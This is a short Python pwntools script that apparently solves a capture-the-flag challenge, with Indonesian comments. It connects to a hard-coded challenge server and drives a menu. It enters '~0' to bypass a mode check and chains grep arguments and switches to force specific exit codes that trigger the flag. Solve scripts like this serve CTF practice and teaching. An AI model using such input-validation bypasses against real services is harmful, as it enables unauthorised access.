from pwn import *

# Konfigurasi koneksi
HOST = '154.57.164.70'
PORT = 31068

def solve():
    try:
        r = remote(HOST, PORT, timeout=5)
        
        # 1. Set mode ke -1 (bypass menggunakan ~0)
        log.info("Setting mode to -1 (~0)...")
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'(mode)> ', b'~0')

        # 2. Set binary ke grep
        log.info("Setting binary to grep...")
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'(bin)> ', b'grep')

        # 3. Set arguments
        # Kita butuh return code 1 (file ada tapi pattern tidak ketemu) 
        # dan return code 2 (file tidak ada)
        # Pastikan tidak ada spasi setelah koma karena ada limit karakter [:13]
        log.info("Setting arguments (server.py,non)...")
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'(arg1,arg2)> ', b'server.py,non')

        # 4. Set switches (pattern pencarian)
        log.info("Setting switches (ZZZ,ZZZ)...")
        r.sendlineafter(b'> ', b'4')
        r.sendlineafter(b'(switch1,switch2)> ', b'ZZZ,ZZZ')

        # 5. Trigger Win Condition
        log.info("Attempting to beat the competitor...")
        r.sendlineafter(b'> ', b'5')

        # Jangan gunakan recvall() karena server tidak menutup koneksi
        # Kita baca beberapa baris untuk melihat flag
        success_msg = r.recvline().decode()
        print(f"\n[!] Server Response: {success_msg}")
        
        # Jika flag ada di baris berikutnya, kita ambil
        if "awesome" in success_msg:
            print(r.recvline().decode())
        else:
            # Jika gagal, tampilkan partial output untuk debug
            print(r.recvline().decode())

        # Masuk ke mode interaktif untuk memastikan jika ada yang terlewat
        r.interactive()

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    solve()
